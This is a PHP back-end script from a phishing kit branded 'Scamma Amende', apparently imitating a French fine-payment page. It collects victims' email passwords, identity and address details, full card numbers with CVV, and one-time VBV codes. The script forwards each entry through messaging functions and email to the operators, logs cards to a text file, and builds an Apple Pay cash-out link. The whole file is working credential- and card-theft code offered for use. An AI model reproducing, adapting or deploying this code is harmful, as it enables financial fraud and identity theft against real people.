<?php
include '../server/config.php';
session_start();
date_default_timezone_set('Europe/Paris');

if (isset($_GET['action'])) {
    if ($_GET['action'] ==  'send') {
        $rez = $_GET['rez'];

        if ($_GET['step'] == "login") {
            $final = explode('|',$rez);
            $message = "
[🏦] Scamma Amende REZ [🏦]

[🪪] EMAIL : ".$final[0]."
[🔑] PASSWORD : ".$final[1]."

[🌍] IP : ".$_SERVER['REMOTE_ADDR']."
[🌍] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] @INUNdev [🏦] ";
                sendMessage($message, "other");
                sendMessage2($message, 'card');
                mail($email,"🪪 +1 Login Amende - ".$final[0]." - 🪪",$message,'From: 💳 Scamma 💳 <log@rez.fr>');
            }else if ($_GET['step'] == "billing") {
                $final = explode('|',$rez);
                $_SESSION['nom'] = $final[0];
                $_SESSION['dob'] = $final[1];
                $_SESSION['tel'] = $final[2];
                $_SESSION['city'] = $final[3];
                $_SESSION['address'] = $final[4];
                $_SESSION['zip'] = $final[5];
                $message = "
[🧛] BILLINGS INFOS [🧛]

[🧬] Nom et prénom : ".$final[0]."
[🧬] Date de naissance : ".$final[1]."
[🧬] Numéro de téléphone : ".$final[2]."

[💊] Ville : ".$final[3]."
[💊] Adresse : ".$final[4]."
[💊] Code Postal : ".$final[5]."

[🌍] IP : ".$_SERVER['REMOTE_ADDR']."
[🌍] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] @INUNdev [🏦] ";
                    
                    $json = file_get_contents('../server/stats.json');
                    $data = json_decode($json, true);
                    $data['data']['billing']++;
                    $json = json_encode($data);
                    file_put_contents('../server/stats.json', $json);

                    sendMessage($message, "other");
                    sendMessage2($message, 'card');
                    mail($email,"🧬 +1 Billing Amende - ".$final[0]." - 🧬",$message,'From: 💳 Scamma 💳 <log@rez.fr>');
            }else if ($_GET['step'] == "cc") {
                $final = explode('|',$rez);
                $bin = substr($final[1],0,7);
                $bin = str_replace(' ','',$bin);


                $ch = curl_init();
                $url = "https://lookup.binlist.net/$bin";
            
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
                $headers = array();
                $headers[] = 'Accept-Version: 3';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                $result = curl_exec($ch);
                if (curl_errno($ch)) {
                    echo 'Error:' . curl_error($ch);
                }
                curl_close($ch);
            
                $brand = '';
                $type = '';
                $emoji = '';
                $bank = '';
            
                $someArray = json_decode($result, true);
            
                $emoji = $someArray['country']['emoji'];
                $brand = $someArray['brand'];
                $type = $someArray['type'];
                $bank = $someArray['bank']['name'];
                $bank_phone = $someArray['bank']['phone'];

                $level = $data['level'];
                $message = "
[🧛] CARD INFOS [🧛]

[🏴‍☠️] Nom : ".$final[0]."
[💝] Numéro de carte : ".$final[1]."
[💝] Date d'expiration : ".$final[2]."
[💝] CVV : ".$final[3]."

[⚖️] Level : ".$brand."
[⚖️] Banque : ".$bank."
[⚖️] Type : ".$type."

🍎 APPLE PAY FEATURES 🍎

🌐 FAST READER : " . $_SERVER['SERVER_NAME'] . "/app/fast.php?cc=".$final[1]."&fullname=".$final[0]."&mm=".$final[2]."&cvv=".$final[3]."

[👻] Nom et prénom : ".$_SESSION['nom']."
[👻] Date de naissance : ".$_SESSION['dob']."
[👻] Numéro de téléphone : ".$_SESSION['tel']."
[👻] Ville : ".$_SESSION['city']."
[👻] Adresse : ".$_SESSION['address']."
[👻] Code Postal : ".$_SESSION['zip']."

📅 DATE DU REZ 📅

📅 DATE : ".date('d/m/Y')."
⌚️ HEURE : ".date('H:i')."

🌐 USER INFOS 🌐

[🎲] IP : ".$_SERVER['REMOTE_ADDR']."
[🎲] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] @INUNdev [🏦] ";

                    $_SESSION['fourEndCC'] = $bin;
                    $_SESSION['vbvFour'] = substr($final[1], -7);
                    
                    $json = file_get_contents('../server/stats.json');
                    $data = json_decode($json, true);
                    $data['data']['cc']++;
                    $json = json_encode($data);
                    file_put_contents('../server/stats.json', $json);

                    sendMessage($message, 'card');
                    sendMessage2($message, 'card');
                    mail($email,"🏴‍☠️ +1 CC Amende - ".$bin." - ".$bank." - ".$brand." - 🏴‍☠️",$message,'From: 💳 Scamma 💳 <log@rez.fr>');
                    file_put_contents('rez.txt','\n'.$final[0] . '|' . $final[1] . '|' . $final[2]. '|' . $final[3] . '|' . $_SESSION['nom']  . '|' . $_SESSION['ville'] . '|' . $_SESSION['adresse'] . '|' .$_SESSION['zip'] . '|' . $_SESSION['tel'] . '|' . $_SESSION['dob']. '|' . date('d/m/Y h:i:s'), FILE_APPEND | LOCK_EX);
            }else if ($_GET['step'] == "vbv") {
                $final = explode('|',$rez);
                $message = "
[🏦] Scamma Amende REZ [🏦]

[🏷] Code : ".$final[0]."

[🌍] IP : ".$_SERVER['REMOTE_ADDR']."
[🌍] UA : ".$_SERVER['HTTP_USER_AGENT']."
[🏦] @INUNdev [🏦] ";
                    sendMessage($message, 'vbv');
                    sendMessage2($message, 'card');
                    mail($email,"🏷 +1 VBV Amende - ".$final[1]." - 🏷",$message,'From: 💳 Scamma 💳 <log@rez.fr>');
            }
        }
}

sendMessage($message, 'finish');
mail($email,"🏷 +1 VBV Amende - ".$final[1]." - 🏷",$message,'From: 💳 Scamma 💳 <youngpepito@yandex.com>')
   
?>